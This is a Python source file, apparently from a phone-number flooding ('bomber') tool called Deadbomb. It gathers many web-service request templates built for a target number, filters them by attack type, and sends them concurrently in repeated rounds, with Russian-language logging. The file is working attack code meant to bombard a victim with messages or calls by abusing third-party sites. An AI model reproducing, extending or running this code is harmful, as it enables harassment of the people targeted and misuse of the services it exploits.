from asyncio import ensure_future, gather, run
from aiohttp import ClientSession
from Deadbomb.Attack.Services import urls
from Deadbomb.Config import check_config as cfg
import logging
import threading as thr
from colorama import Fore
	
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s:%(message)s")


async def request(session, url):
    try:
        inf = url['info']
        logging.info(Fore.YELLOW+f"SEND {inf['website']} TYPE:{inf['attack']}")
        async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
            logging.info(Fore.GREEN + f"SUCCESFULY {inf['website']} TYPE:{inf['attack']} CODE: {response.status}")
    except Exception as e:
        logging.error(Fore.RED + f"ERROR {inf['website']} TYPE:{inf['attack']} EXC: {e}")



async def async_attacks(number, services):
    async with ClientSession() as session:
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)



def start_async_attacks(number, replay, type_):
    logging.info(f"Начата сборка сервисов под категории {', '.join(type_)}")
    services = []
    for i in urls(number):
    	if i['info']['attack'] in type_:
    		services.append(i)
    logging.info(f'Сборка сервисов завершена. Всего {len(services)} сервисов.')
    for _ in range(int(replay)):
        run(async_attacks(number, services))
